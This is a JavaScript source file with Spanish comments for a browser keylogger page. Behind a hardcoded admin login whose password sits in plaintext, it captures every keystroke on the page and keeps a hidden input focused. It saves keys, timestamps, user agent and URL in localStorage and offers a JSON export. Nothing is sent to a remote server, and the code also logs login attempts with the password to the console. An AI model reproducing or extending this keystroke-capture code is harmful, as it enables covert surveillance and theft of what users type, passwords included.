// Credenciales del administrador
const ADMIN_USERNAME = 'pipi';
const ADMIN_PASSWORD = 'ppppp55555';

// Variables globales
let keyLogs = [];
let isMonitoring = false;

// Inicializar la aplicación
document.addEventListener('DOMContentLoaded', function() {
console.log('Página cargada - Inicializando sistema...');
checkLoginStatus();
loadLogsFromStorage();
});

// ==================== SISTEMA DE AUTENTICACIÓN ====================

function checkLoginStatus() {
const isLoggedIn = localStorage.getItem('adminLoggedIn') === 'true';
console.log('Estado de login:', isLoggedIn);

if (isLoggedIn) {
showAdminSection();
startKeylogger();
} else {
showLoginSection();
}
}

function login() {
const username = document.getElementById('username').value;
const password = document.getElementById('password').value;
const loginError = document.getElementById('loginError');

console.log('Intentando login con:', { username, password });

if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
localStorage.setItem('adminLoggedIn', 'true');
console.log('Login exitoso');
showAdminSection();
loginError.style.display = 'none';
startKeylogger();
} else {
console.log('Login fallido');
loginError.style.display = 'block';
}
}

function logout() {
localStorage.setItem('adminLoggedIn', 'false');
showLoginSection();
stopKeylogger();
}

function showLoginSection() {
console.log('Mostrando sección de login');
document.getElementById('loginSection').style.display = 'block';
document.getElementById('adminSection').classList.add('hidden');
document.getElementById('loginError').style.display = 'none';
}

function showAdminSection() {
console.log('Mostrando sección de administrador');
document.getElementById('loginSection').style.display = 'none';
document.getElementById('adminSection').classList.remove('hidden');
loadLogsFromStorage();
updateLogsDisplay();
}

// ==================== SISTEMA DE KEYLOGGER ====================

function startKeylogger() {
if (isMonitoring) {
console.log('Keylogger ya está activo');
return;
}

isMonitoring = true;
const hiddenInput = document.getElementById('hiddenInput');

console.log('Iniciando keylogger...');

// Enfocar el input oculto
hiddenInput.focus();

// Capturar todas las teclas presionadas en la página
document.addEventListener('keydown', function(event) {
if (!isMonitoring) return;

const key = event.key;
const keyCode = event.keyCode || event.which;

// Ignorar teclas de navegación y función específicas
if (shouldLogKey(key)) {
logKeyPress(key, keyCode);
}
});

// También capturar el input en el campo oculto
hiddenInput.addEventListener('input', function(event) {
if (!isMonitoring) return;

const value = event.target.value;
if (value) {
logKeyPress(value.charAt(value.length - 1), null);
event.target.value = ''; // Limpiar después de capturar
}
});

// Mantener el foco en el input oculto
document.addEventListener('click', function() {
hiddenInput.focus();
});

console.log('Keylogger iniciado correctamente');
}

function shouldLogKey(key) {
// No registrar teclas de control específicas
const ignoreKeys = ['Control', 'Alt', 'Shift', 'Meta', 'OS', 'CapsLock'];
return !ignoreKeys.includes(key);
}

function stopKeylogger() {
isMonitoring = false;
console.log('Keylogger detenido');
}

function logKeyPress(key, keyCode) {
const timestamp = new Date().toLocaleString('es-ES');
const logEntry = {
id: Date.now() + Math.random(),
key: key,
keyCode: keyCode,
timestamp: timestamp,
userAgent: navigator.userAgent,
url: window.location.href
};

keyLogs.unshift(logEntry);

// Limitar a 1000 entradas máximo
if (keyLogs.length > 1000) {
keyLogs = keyLogs.slice(0, 1000);
}

// Guardar en localStorage
saveLogsToStorage();

// Actualizar vista si el admin está logueado
if (localStorage.getItem('adminLoggedIn') === 'true') {
updateLogsDisplay();
}
}

// ==================== GESTIÓN DE REGISTROS ====================

function loadLogsFromStorage() {
const savedLogs = localStorage.getItem('keyLoggerData');
if (savedLogs) {
try {
keyLogs = JSON.parse(savedLogs);
console.log('Logs cargados:', keyLogs.length);
} catch (e) {
console.error('Error cargando logs:', e);
keyLogs = [];
}
} else {
keyLogs = [];
}
}

function saveLogsToStorage() {
try {
localStorage.setItem('keyLoggerData', JSON.stringify(keyLogs));
} catch (e) {
console.error('Error guardando logs:', e);
}
}

function updateLogsDisplay() {
const logsList = document.getElementById('logsList');

if (!logsList) {
console.error('No se encontró el elemento logsList');
return;
}

if (keyLogs.length === 0) {
logsList.innerHTML = '<p>No hay registros de teclas aún.</p>';
return;
}

logsList.innerHTML = keyLogs.map(log => `
<div class="log-entry">
<span class="timestamp">[${log.timestamp}]</span>
<strong>Tecla:</strong> "${escapeHtml(log.key)}"
<strong>Código:</strong> ${log.keyCode || 'N/A'}
</div>
`).join('');
}

function clearLogs() {
if (confirm('¿Estás seguro de que quieres eliminar TODOS los registros?')) {
keyLogs = [];
localStorage.removeItem('keyLoggerData');
updateLogsDisplay();
console.log('Logs eliminados');
}
}

function exportLogs() {
const dataStr = JSON.stringify(keyLogs, null, 2);
const dataBlob = new Blob([dataStr], {type: 'application/json'});

const link = document.createElement('a');
link.href = URL.createObjectURL(dataBlob);
link.download = `keylogger-data-${new Date().toISOString().split('T')[0]}.json`;
link.click();
console.log('Logs exportados');
}

// Función auxiliar para escapar HTML
function escapeHtml(text) {
const div = document.createElement('div');
div.textContent = text;
return div.innerHTML;
}

// ==================== EVENTOS GLOBALES ====================

window.addEventListener('beforeunload', function() {
saveLogsToStorage();
});

// Recargar logs cuando la página gana visibilidad
document.addEventListener('visibilitychange', function() {
if (!document.hidden && localStorage.getItem('adminLoggedIn') === 'true') {
loadLogsFromStorage();
updateLogsDisplay();
}
});

// También permitir login con Enter
document.getElementById('password').addEventListener('keypress', function(e) {
if (e.key === 'Enter') {
login();
}
});